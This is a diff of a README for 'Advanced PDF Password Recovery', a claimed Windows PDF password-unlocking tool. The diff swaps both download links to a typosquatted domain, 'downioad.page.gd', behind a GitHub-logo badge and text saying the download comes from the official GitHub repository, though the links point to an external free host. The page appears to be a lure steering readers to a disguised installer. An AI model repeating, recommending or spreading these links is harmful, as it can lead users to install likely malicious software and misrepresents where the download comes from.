@@ -2,7 +2,7 @@
 
 Advanced PDF Password Recovery is a sophisticated software solution designed to help users regain access to password-protected PDF documents. Whether you've forgotten your password or need to access an old file, this tool provides a reliable and efficient method for password recovery. It is tailored for Windows desktop environments and supports the latest encryption technologies as of 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -49,6 +49,6 @@ Support is available through online documentation and community forums. For more
 
 To get started, download the latest version of Advanced PDF Password Recovery from the official GitHub repository.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026
